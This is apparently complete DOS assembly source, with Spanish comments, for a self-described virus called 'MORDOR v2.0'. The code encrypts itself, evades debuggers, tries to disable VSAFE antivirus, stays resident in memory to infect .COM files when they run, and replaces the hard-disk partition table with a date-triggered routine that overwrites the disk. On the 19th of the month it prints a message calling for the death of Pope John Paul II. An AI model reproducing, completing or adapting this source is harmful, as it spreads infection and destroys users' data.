code    segment
    assume cs:code,ds:code
    org   100h
start:












;***********************
;* ENCRIPTOR / DECRIPTOR
;***********************

    CMP BYTE PTR cs:[cript],0B8h
    JE CRIPT
    mov cx,offset fin - 100h
        mov di,offset cript
        mov dx,word ptr cs:[clave]

desencripto:
        xor word ptr cs:[di],dx
        inc di
        inc di
        inc dx

lOOP desencripto

;***************
;* CAGO AL DEBUG
;***************


CRIPT:
    mov ax,3501h
    int 21h
    mov word ptr DEBUG1,bx
    mov word ptr DEBUG1+2,es

    mov ax,3503h
    int 21h
    mov word ptr DEBUG2,bx
    mov word ptr DEBUG2+2,es

    MOV BX,OFFSET RIP_HD
    MOV AX,2501H
    INT 21H
    INC AL
    INC AL
    INT 21H

    MOV AX,2501H
    LEA BX,DEBUG1
    MOV DS,BX
    LEA BX,DEBUG1+2
    INT 21H

    MOV AX,2503H
    LEA BX,DEBUG2
    MOV DS,BX
    LEA BX,DEBUG2+2
    INT 21H

;**************
;* CAGO EL VSAV
;**************

    mov dx,5945h
    mov ax,0fa01h
    int 21h


;*******************
;* PREGUNTO LA FECHA
;*******************

    MOV AH,2AH
    INT 21H
    CMP Dl,19
    JNE DIA
    MOV AH,9
    push cs
        pop ds
        MOV DX,OFFSET PAO
    INT 21H

        MOV AX,4C00H
    INT 21H
    DIA:
    JMP DIA_INCORRECTO

        PAO:
        DB 10,13,'Virus MORDOR v2.0',0dh,0ah
        db       'Escrito por AZRAEL bajo supervicion del G.t.I.A y G.F. ',0DH,0AH,0dh,0ah
        db       'Muerte al PAPA Juan Pablo II',10,13,'$'
;****************************************
;* PREGUNTO SI EL VIRUS YA ESTA INSTALADO
;****************************************

DIA_INCORRECTO:

    MOV AX,35DAH
    INT 21H
    CMP BX,1
    JE PUM

;+++++++++++++++++++++++++++++++++++++++++++
;+ PONGO LA BOMBA EN LA TABLA DE PARTICION +
;+++++++++++++++++++++++++++++++++++++++++++

;****************************************
;* LEO LA TABLA DE PARTICION DEL DISCO C
;****************************************

    mov ax,9f80h
    mov es,ax
    mov ah,02h
    mov al,1
    xor ch,ch
    mov dl,80h
    mov cl,1
    mov dh,0
    mov bx,0
    int 13h

;*******************************************************
;* PONGO MI TABLA DE PARTICON CON LA BOMBA SOBRE LA OTRA
;*******************************************************

    push cs
    pop ds

    mov ax,9f80h
    mov es,ax
    mov si,offset fat
    mov di,0
    mov cx,105
    repe movsb

;************************
;* ESCRIBO LA TABLA NUEVA
;************************

    mov ax,9f80h
    mov es,ax

    xor bx,bx
    mov ah,03h
    mov al,1
    xor ch,ch
    mov dl,80h
    mov cl,1
    mov dh,0
    mov bx,0
    int 13h

push cs
pop ds
push cs
pop es

;**********************************
;* SALTO A LA INSTALACION RESIDENTE
;**********************************

    jmp   setup

ERROR dd ?
NUMERO DB '0'

virus proc far

;***************************************************************
;* SI ES EJECUCION DE UN PROGRAMA TOMA EL CONTROL EL VIRUS
;***************************************************************

    cmp ah,4bh
    je REPRODUCCION
    a3:
    jmp PROSEGIR

PUM:
JMP PUM1
a:
pop bx
pop dx
jmp a3

REPRODUCCION:

push dx
push bx

push dx
pop bx

;***********************
;* ES EL COMMAND.COM ???
;***********************

    add bx,6
    mov dl,byte ptr ds:[bx]
    cmp dl,77
    jne voy

    dec bx
    mov dl,byte ptr ds:[bx]
    cmp dl,77
    je a

voy:
pop bx
pop dx


push ds
push dx
push es
push ax
push bx
push cx
pushf

push ds
push dx

;**********************************
;* ME CUELGO DE LOS ERRORES DEL DOS
;**********************************

    PUSH CS
    POP DS
    MOV AX,3524H
    INT 21H
    MOV WORD PTR ERROR,ES
    MOV WORD PTR ERROR+2,BX

    MOV AX,2524H
    MOV DX,OFFSET ALL
    INT 21H

    pop dx
    pop ds

;*****************************
;* PIDO LOS ATRIBUTOS DEL FILE
;*****************************

    mov ax,4300h
    int 21h
    push cx ;--- PONGO LOS ATRIBUTOS EN LA PILA (ATRIB)

;********************************
;* LE SACO LOS ATTRIBUTOS EL FILE
;********************************

    mov ax,4301h
    xor cx,cx
    int 21h

;*************************
; ABRO EL ARCHIVO PARA L/E
;*************************

    mov ax,3d02h ;--- ABRO EL FILE PARA LEER/ESCRIBIR
    int 21h
    push ax  ;--- 1 PONGO EL HANDLE EN PILA (ATRIB,HANDLE)
    mov bx,ax

;************************
;* PIDO LA FECHA DEL FILE
;************************

    MOV AX,5700H
    INT 21H

    MOV AL,CL
    OR CL,1FH
    DEC CX
    DEC CX
    XOR AL,CL
    JZ YA_ESTA

    MOV SI,CX
    MOV DI,DX

;*****************************
;* PIDO UN SEGMENTO DE MEMORIA
;*****************************

    MOV AH,48H
    MOV BX,1000H
    INT 21H
    PUSH AX ;--- 2 PONGO EL SEGMENTO ASIGNADO EN PILA (ATRB,HANDLE,SEG_ASIG)

;*****************************************
;* MUEVO EL ARCHIVO A MI SEGMENTO ASIGNADO
;*****************************************

    pop ds    ;--- SACO EL SEGMENTO DE LA PILA (2) (HANDLE)
    pop bx    ;--- SACO EL HANDLE SE LA PILA (1) (ATRIB)
    push bx   ;--- 3 PONGO EL HANDLE EN LA PILA (ATRIB,HANDLE)
    push ds   ;--- 4 PONGO EL SEGMENTO EN LA PILA (ATRIB,HANDLE,SEG_ASIG)
    mov ah,3fh
    mov cx,64000
    mov dx,offset fin - 100h
    int 21h
    push AX   ;--- 5 PONGO LA CATIDAD DE BYTES LEIDOS (ATRIB,HANDLE,SEG_ASIG,BYTES)
    cmp ax,1
    jb mal_t
    cmp ax,62000
    jnb mal_t

;********************************
;* CONTROLO SI EL FILE ES UN .COM
;********************************

    mov bx,offset fin - 100h
    mov dl,byte ptr ds:[bx]
    cmp dl,77
    jne INFECTAR
    inc bx
    mov dl,byte ptr ds:[bx]
    cmp dl,90
    JNE INFECTAR
mal_t:
    pop ax
    pop es
    mov ah,49h
    int 21h
    pop BX
    mov ah,3Eh
    int 21h
    jmp eje

;************************************
;* CONTROLO SI EL FILE ESTA INFECTADO
;************************************


YA_ESTA:
    pop bx
    mov ah,3Eh
    int 21h
    jmp eje
    pop ax
PUM1:
JMP ejecuto

INFECTAR:

;********************************************
;* MUEVO EL PUNTERO DEL ARCHIVO A SU COMIENZO
;********************************************

    POP CX  ;--- SACO LOS BYTES LEIDOS (5) (ATRIB,HANDLE,SEG_ASIG)
    POP DX  ;--- SACO EL SEGMENTO ASIGNADO (4) (ATRIB,HANDLE)
    POP BX  ;--- SACO EN HANDLE (3) (ATRIB)
    PUSH DX ;--- 6 PONGO EL SEGMENTO EN LA PILA (ATRIB,SEG_ASIG)
    PUSH CX ;--- 7 PONGO LOS BYTES LEIDOS EN LA PILA (ATRIB,SEG_ASIG,BYTES)
    push dx
    MOV AX,4200H
    XOR CX,CX
    XOR DX,DX
    INT 21H

;**************************************
;*  COPIA MI VIRUS AL COMIENZO DEL FILE
;**************************************

    pop ds
    push di
    push si
    push ds

        era_c:
        mov ah,2ch
        int 21h
        cmp dl,0
        je era_c
        cmp dh,0
        je era_c
        xor dx,cx

        mov word ptr cs:[clave],dx

    push cs
    pop ds
    mov si,100h
    pop es
    xor di,di
    mov cx,offset fin - 100h
        rep movsb

        push es
        pop ds

        mov di,offset cript - 100h
    mov cx,offset fin - 100h

        cri_copia:

        xor word ptr ds:[di],dx
        inc di
        inc di
        inc dx
        loop cri_copia

    pop si
    pop di

;*****************************************
;* COPIA EL FILE A INFECTAR A CONTINUACION
;*****************************************
c1:

    POP CX ;---  SACO LOS BYTES LEIDOS (7) (ATRIB,SEG_ASIG)
    POP DS ;---  SACO EL SEGMENTO ASIGNADO (6) (ATRIB)
    PUSH DS ;--- 8 PONGO EL SEGMENTO ASIGNADO (ATRIB,SEG_ASIG)
    add cx,offset fin - 100h
    MOV AH,40H
    XOR DX,DX
    INT 21H


SALIR:

;***********************************
;* RESTAURO LA FECHA Y HORA DEL FILE
;***********************************

    MOV AX,5701H
    MOV DX,DI
    MOV CX,SI
    INT 21H

;****************
;* CIERRO EL FILE
;****************

    mov ah,3eh
    int 21h

;*****************************
;* LIBERO EL BLOQUE DE MEMORIA
;*****************************

    POP ES ;--- SACO EL SEGMENTO ASIGNADO (8) (ATRIB)
    mov ah,49h
    int 21h


eje:

;************************
;* RECUPERO LOS ATRIBUTOS
;************************

    pop cx ;--- SACO LOS ATRIB'S DE LA PILA ()
    mov si,cx

popf
pop cx
pop bx
pop ax
pop es
pop dx
pop ds

push ds
push dx
push es
push ax
push bx
push cx
pushf

;************************
;* RESTAURO LOS ATRIBUTOS
;************************

    MOV AX,4301H
    mov cx,si
    INT 21H

;************************************
;* RESTAURO EL CONTROLADOR DE ERRORES
;************************************

de_erro:

    MOV AX,2524H
    LEA BX,error
    MOV DS,BX
    LEA bx,ERROR+2
    INT 21H


popf
pop cx
pop bx
pop ax
pop es
pop dx
pop ds

;**********************
;* SI NO ERA LA 4B SALE
;**********************

prosegir:

    JMP dword ptr CS:[INT21]
    RET

;******************************
;* MUEVO EL FILE A LA POS. 100H
;******************************

ejecuto:

    PUSH CS
    POP DS
    MOV SI,OFFSET CARGADOR
    PUSH CS
    POP ES
    MOV DI,64005
    MOV CX,30
    REP MOVSB
    MOV AX,64005
    JMP AX

    CARGADOR:
    PUSH CS
    POP ES
    mov cx,63000
    PUSH CS
    POP DS
    MOV SI,OFFSET FIN
    MOV DI,100H
    REP MOVSB
    MOV AX,100H
    JMP AX

;*************************************
;* PONE 0 EN EL CONTROLADOR DE ERRORES
;*************************************

all:

    xor al,al
    iret


int21   dd ?
DEBUG1 DD ?
DEBUG2 DD ?
virus endp
end_ISR label byte

setup:

;**********************************
;* MARCO UNA INTERRUPCION COMO GUIA
;**********************************

    MOV AX,25daH
    MOV DX,1
    INT 21H

;***********************************
;* PIDO LOS VECTORES DE INTERRUPCION
;***********************************

    mov   ax,3521h
    int   21h
    mov   word ptr int21,bx
    mov   word ptr int21+2,es

;***************************
;* PIDO UN BLOQUE DE MEMORIA
;***************************

    push cs
    pop es
    mov ah,4ah
    mov bx,150h
    int 21h

;*******************************************
;* BUSCO EL NOMBRE DEL FILE EN EL ENVIROMENT
;*******************************************

    mov ds,word ptr cs:[2ch]
    xor bx,bx

nuevo:

    inc bx
    mov dl,byte ptr ds:[bx]
    cmp dl,00
    jne nuevo

nuevo1:

    inc bx
    mov dl,byte ptr ds:[bx]
    cmp dl,00
    jne nuevo1

nuevo2:

    inc bx
    mov dl,byte ptr ds:[bx]
    cmp dl,01
    jne nuevo2

nuevo3:

    inc bx
    mov dl,byte ptr ds:[bx]
    cmp dl,00
    jne nuevo3


cero3:

inc bx
push bx
pop dx
push dx
push ds
push cs
pop ds

;************************
;* LEO EL PARAMETER BLOCK
;************************

    lea bx,block
    mov word ptr ds:[bx],cs
    mov word ptr ds:[bx+2],80h
    mov word ptr ds:[bx+4],cs
    mov word ptr ds:[bx+6],5ch
    mov word ptr ds:[bx+8],cs
    mov word ptr ds:[bx+10],6ch
    mov word ptr ds:[bx+12],cs
    mov bx,offset block

push cs
pop es
pop ds
pop dx

;*****************
;* EJECUTO EL FILE
;*****************

    mov ax,4b00h
    int 21h

push cs
pop ds

;*************************************************
;* APUNTO LOS VECTORES DE INTERRUPCION A MI RUTINA
;*************************************************

    mov   ax,2521h
    mov   dx,offset virus
    int   21h

;*****************************
;* TERMINAR Y QUEDAR RESIDENTE
;*****************************

    mov   dx,offset fin
    int   27h


block  dw (0)
       dd  ?
       dd  ?
       dd  ?

;*****************************
;* BOMBA QUE DESTRUYE EL DISCO
;*****************************

fat:
        cli
        xor     ax,ax
        mov     ss,ax
        mov     sp,7C00h
        mov     si,sp
        push    ax
        pop     es
        push    ax
        pop     ds
        sti

        pushf
        push ax
        push cx
        push dx
        push ds
        push es

        MOV AH,04H
        INT 1AH

        CMP DH,04
        JE CAGO
        lit:
        pop es
        pop ds
        pop dx
        pop cx
        pop ax
        popf
        jmp booti

        CAGO:

rip_hd:
        xor dx, dx
rip_hd1:
        mov cx, 2
        mov ax, 311h
        mov dl, 80h
        mov bx, 5000h
        mov es, bx
        int 13h
        jae rip_hd2
        xor ah, ah
        int 13h
        rip_hd2:
        inc dh
        cmp dh, 1
        jb rip_hd1
        inc ch
        jmp rip_hd

booti:
        xor ax,ax
        mov es,ax
        mov bx,7c00h
        mov ah,02
        mov al,1
        mov cl,1
        mov ch,0
        mov dh,1
        mov dl,80h

        int 13h

        db 0eah,00,7ch,00,00


fin:
code    ends

end    start
